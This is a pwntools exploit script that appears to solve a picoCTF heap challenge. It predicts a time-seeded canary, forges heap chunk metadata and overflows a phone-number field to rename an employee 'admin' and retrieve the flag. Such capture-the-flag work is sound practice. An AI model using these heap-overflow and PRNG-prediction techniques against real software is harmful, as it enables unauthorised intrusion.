#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./the_office")
libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")

libc.srand(libc.time(None) + 1)     # +1 for the delay between us and the server; remove it for LOCAL tests
canary = libc.rand()
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 39151)

    return r


def add_employee(name: bytes, salary: int, phone: bytes, email: bytes = None, bldg: bytes = None):
    r.sendlineafter(b"token\n", b"1")
    r.sendlineafter(b"Name: ", name)

    if email is not None:
        r.sendlineafter(b"(y/n)? ", b"y")
        r.sendlineafter(b"Email: ", email)
    else:
        r.sendlineafter(b"(y/n)? ", b"n")

    r.sendlineafter(b"Salary: ", str(salary).encode("ascii"))
    r.sendlineafter(b"Phone #: ", phone)

    if bldg is not None:
        r.sendlineafter(b"(y/n)? ", b"y")
        r.sendlineafter(b"Bldg #: ", bldg)
    else:
        r.sendlineafter(b"(y/n)? ", b"n")


def remove_employee(index: int):
    r.sendlineafter(b"token\n", b"2")
    r.sendlineafter(b"Employee #?", str(index).encode("ascii"))


def print_employees():
    r.sendlineafter(b"token\n", b"3")


def get_access_token(index: int):
    r.sendlineafter(b"token\n", b"4")
    r.sendlineafter(b"Employee #?", str(index).encode("ascii"))
    return r.recvlines(2)[-1].decode("ascii")


# NOTE: Basically a stack challenge (conceptually) but on the heap :)
def main():
    r = conn()

    add_employee(b"AAAA", 123, b"456")
    add_employee(b"BBBB", 321, b"654")

    # Next allocation will be the chunk before "BBBB"
    remove_employee(0)

    # The actual size of each chunk is actually 12 bytes more than the "Size" listed by heapcheck;
    # the extra 12 bytes are a header at the beginning of each chunk.
    # 
    # ** The first 4 bytes (little-endian 32-bit unsigned integer) are the "canary" as given by heapcheck: it's the same value
    #    for every chunk, but it changes every time the program is restarted and even if one chunk's Canary doesn't match the value
    #    `heapcheck()` has stored it will crash!
    # ** The next 4 bytes are the used for the "size": always an even number (plus 1 iff chunk is "allocated")
    #
    # ** The last 4 bytes are used for the "prev_size": always an even number (plus 1 iff "prev_allocated")
    #
    # ** "prev_size" must match the "size" of the previous chunk and "prev_allocated" must match the "allocated" of the previous chunk,
    #    or else heapcheck will throw a "heap smashing" error and abort.
    payload = flat(
        b"A" * 28,
        canary,
        53,         # Previous chunk's metadata (prev_size)
        53,         # Previous chunk's metadata (size)
        b"admin"
    )

    # Overwrite next employee's name with "admin"
    # NOTE: Sometimes it may crash due to an invalid canary since `rand()` could differ slightly due to `srand()`.
    #       Retry a few times until it works
    add_employee(b"CCCC", 231, payload)
    flag = get_access_token(1)
    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
